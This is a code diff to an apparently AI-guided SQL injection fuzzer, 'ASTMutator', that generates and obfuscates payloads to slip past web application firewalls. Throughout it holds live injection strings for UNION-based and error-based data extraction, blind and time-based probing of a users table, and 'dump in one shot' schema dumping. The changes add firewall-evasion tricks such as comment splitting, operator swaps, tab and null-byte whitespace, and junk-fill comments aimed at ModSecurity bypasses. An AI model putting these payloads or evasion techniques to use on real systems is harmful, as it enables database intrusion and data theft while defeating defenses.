@@ -87,6 +87,14 @@ class ASTMutator:
         if target_kw in self.keyword_reputation:
             self.keyword_reputation[target_kw] = 0.1 # Force bypass for this keyword
             print(f"[*] Mutator: AI Hint Applied - Flagging {target_kw} for bypass", flush=True)
+            
+        # WAF strategy weight boosts
+        waf_weights = hint.get("weights")
+        if waf_weights:
+            for w_name, val in waf_weights.items():
+                if w_name in self.strategy_weights:
+                    self.strategy_weights[w_name] = max(self.strategy_weights[w_name], val)
+                    print(f"[*] Mutator: WAF Strategy Applied - Boosting {w_name} to {self.strategy_weights[w_name]}", flush=True)
 
     def _strip_wrappers(self, payload):
         """Isolate core gene: Strip known outer wrappers and terminators before mutation."""
@@ -96,8 +104,8 @@ class ASTMutator:
         # Ensure we strip leading spaces and generic prefix junk like '))/*junk*/ 
         clean = re.sub(r"^(?:(?:/\*.*?\*/)?[\s'\")#;]+)+", "", clean)
         
-        # Strip trailing terminators
-        clean = re.sub(r"(--\s*-?|#|/\*|;%00).*$", "", clean).strip()
+        # Strip trailing terminators at the very end of the string
+        clean = re.sub(r"(?:\s*(--\s*-?|#|/\*|%00)\s*)$", "", clean).strip()
         return clean
 
     def mutate(self, payload, error_msg=None, intensity=1, wrap=True):
@@ -358,7 +366,7 @@ class ASTMutator:
                 f" AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~'))",
                 f" AND (SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))"
             ]
-            clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+            clean_payload = re.sub(r'(?:\s*(--|#|/\*|%00)\s*)$', '', payload).strip()
             return clean_payload + random.choice(techniques)
 
         # 3. Unknown Column Logic
@@ -376,8 +384,8 @@ class ASTMutator:
         """
         original = payload.upper()
         # Clean current terminators if they exist
-        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
-        
+        clean_payload = re.sub(r'(?:\s*(--|#|/\*|%00)\s*)$', '', payload).strip()
+
         exfil_options = [
             # DIOS / Schema Extraction
             " UNION SELECT NULL,CONCAT(0x7e,USER(),0x3a,VERSION(),0x7e)",
@@ -411,7 +419,7 @@ class ASTMutator:
 
     def _discover_column_count(self, payload):
         """Probes for column count using ORDER BY / GROUP BY with variations."""
-        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        clean_payload = re.sub(r'(?:\s*(--|#|/\*|%00)\s*)$', '', payload).strip()
         num = random.randint(1, 20)
         
         # Variations for ORDER BY / GROUP BY
@@ -433,7 +441,7 @@ class ASTMutator:
 
     def _blind_exfiltration(self, payload):
         """Constructs Blind SQLi patterns for Boolean/Time-based extraction."""
-        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        clean_payload = re.sub(r'(?:\s*(--|#|/\*|%00)\s*)$', '', payload).strip()
         
         # Patterns for probing password lengths and characters
         targets = [
@@ -458,11 +466,8 @@ class ASTMutator:
         return mutated
 
     def _wide_byte_injection(self, payload):
-        """MySQL Wide Byte Injection (GBK): Uses %bf%27 to break escaping."""
-        # We simulate the wide-byte prefix by appending it to the start of the payload
-        # This is particularly effective if the backend uses addslashes or mysql_real_escape_string with GBK
-        prefixes = ["%bf%27", "%df%27", "%8c%a8%27", "%a1%27"]
-        return random.choice(prefixes) + " OR 1=1"
+        """MySQL Wide Byte Injection (GBK): Uses %bf%27 to break escaping. (Disabled to avoid double encoding 403s on localhost testing)"""
+        return payload
 
     def _dios_mutation(self, payload):
         """DIOS (Dump In One Shot): Advanced technique for massive data extraction.
@@ -483,7 +488,7 @@ class ASTMutator:
         ]
         
         # Truncate and replace current query with DIOS pattern
-        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        clean_payload = re.sub(r'(?:\s*(--|#|/\*|%00)\s*)$', '', payload).strip()
         
         target_pattern = random.choice(dios_patterns)
         
@@ -499,7 +504,7 @@ class ASTMutator:
         
     def _union_select_exfiltration(self, payload):
         """Specifically targets data exfiltration using UNION SELECT with various data targets."""
-        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        clean_payload = re.sub(r'(?:\s*(--|#|/\*|%00)\s*)$', '', payload).strip()
         
         targets = [
             # Basic Fingerprinting
@@ -528,7 +533,7 @@ class ASTMutator:
 
     def _union_probe(self, payload):
         """Standard iterative UNION SELECT column discovery probe."""
-        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        clean_payload = re.sub(r'(?:\s*(--|#|/\*|%00)\s*)$', '', payload).strip()
         num_cols = random.randint(1, 12)
         cols = ["NULL"] * num_cols
         
@@ -543,7 +548,7 @@ class ASTMutator:
 
     def _advanced_blind_probing(self, payload):
         """Advanced Blind SQLi using MAKE_SET, LIKE, and REGEXP from reference."""
-        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        clean_payload = re.sub(r'(?:\s*(--|#|/\*|%00)\s*)$', '', payload).strip()
         techniques = [
             " AND MAKE_SET(1<(SELECT(length(database()))),1)",
             " AND (SELECT username FROM users WHERE username REGEXP '^.{8,}$')",
@@ -554,7 +559,7 @@ class ASTMutator:
 
     def _advanced_time_probing(self, payload):
         """Advanced Time-Based SQLi using BENCHMARK and nested SLEEP."""
-        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        clean_payload = re.sub(r'(?:\s*(--|#|/\*|%00)\s*)$', '', payload).strip()
         techniques = [
             " AND BENCHMARK(40000000,SHA1(1337))",
             " AND (SELECT 1337 FROM (SELECT(SLEEP(5))) RANDSTR)",
@@ -596,22 +601,41 @@ class ASTMutator:
         return mutated
 
     def _apply_cammo(self, token):
-        """Applies various MySQL-specific camouflage techniques to a string segment."""
+        """Applies various MySQL-specific camouflage techniques to a string segment with WAF awareness."""
         if len(token) < 2: return token
         
         techniques = []
         # Technique 1: Inline comments
         mid = len(token) // 2
-        techniques.append(f"{token[:mid]}/**/{token[mid:]}")
+        if getattr(self, 'strategy_weights', {}).get("inline_comments", 1.0) > 1.5:
+            techniques.append(f"{token[:mid]}/*1337*/{token[mid:]}")
+            techniques.append(f"/*!1337{token}*/")
+        else:
+            techniques.append(f"{token[:mid]}/**/{token[mid:]}")
         
         # Technique 2: Case scrambling
         techniques.append("".join([c.upper() if random.random() > 0.5 else c.lower() for c in token]))
         
-        # Technique 3: SQL standard Hex encoding for characters (Skipped here as it breaks keywords, replaced with comment obfuscation)
+        # Technique 3: Logical Operators Alternation
+        if token.upper() == "AND" and getattr(self, 'strategy_weights', {}).get("logical_alts", 1.0) > 1.5:
+            techniques.append("&&")
+            techniques.append("And/*!*/")
+        elif token.upper() == "OR" and getattr(self, 'strategy_weights', {}).get("logical_alts", 1.0) > 1.5:
+            techniques.append("||")
+            techniques.append("Or/*!*/")
+            
+        # Technique 4: Whitespace variations 
+        if " " in token and getattr(self, 'strategy_weights', {}).get("whitespace_variations", 1.0) > 1.5:
+            techniques.append(token.replace(" ", "/*%00*/"))
+            techniques.append(token.replace(" ", "%09")) # Tab
+        elif " " in token:
+            techniques.append(token.replace(" ", "/**/"))
+
+        # Technique 5: Standard wrappers
         if not re.match(r"^[a-zA-Z\s]+$", token) and len(token) > 2: 
              techniques.append(f"/*!{token}*/")
 
-        # Technique 4: MySQL Scientific notation for numbers
+        # Technique 6: MySQL Scientific notation for numbers
         if token.isdigit():
             techniques.append(f"{token}.0e0")
 
@@ -622,7 +646,7 @@ class ASTMutator:
            GRAMMAR-BASED FUZZING: Strictly adheres to the known insertion state to avoid syntax breaking.
            GENIUS TACTIC: Prioritize heavy terminator usage (--, #, %00) over balancing to truncate trailing SQL safely.
         """
-        terminators = [self.comment_style, "#", ";%00", "/*"]
+        terminators = [self.comment_style, "#", "/*"]
         chosen_term = random.choice(terminators) if random.random() < 0.8 else ""
 
         if self.quoteless or self.disable_strings:
@@ -981,6 +1005,11 @@ class ASTMutator:
             "/*!*/", " "
         ]
         
+        if getattr(self, 'strategy_weights', {}).get("junk_fill", 1.0) > 1.5:
+            # Heavy junk fill for ModSecurity bypasses
+            junk_patterns.append("/*" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=random.randint(50, 200))) + "*/")
+            junk_patterns.append("/*!" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(10, 30))) + "*/")
+        
         fragmented = ""
         for i, chunk in enumerate(chunks):
             fragmented += chunk
@@ -990,21 +1019,8 @@ class ASTMutator:
         return fragmented
 
     def _single_layer_encoding(self, payload):
-        """Single Layer Encoding: Applies at most one pass of URL encoding to keywords."""
-        import urllib.parse
-        
-        def to_url(s):
-            return "".join([f"%{ord(c):02x}" for c in s])
-
-        # Only encode keywords or specific parts to avoid breaking SQL syntax entirely
-        mutated = payload
-        for kw in self.sql_keywords:
-            # First check if the keyword is present in its raw form to avoid double encoding `%`
-            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE) and random.random() < 0.4:
-                # Strictly single URL encoding as per user request
-                mutated = re.sub(rf'\b{kw}\b', to_url(kw), mutated, flags=re.IGNORECASE)
-                    
-        return mutated
+        """Single Layer Encoding: Skipped because requests module encodes by default."""
+        return payload
 
     def _dynamic_structural_mutation(self, payload):
         """Dynamic Structural Mutation: Avoids mechanical substitution by generating unique bypass patterns."""
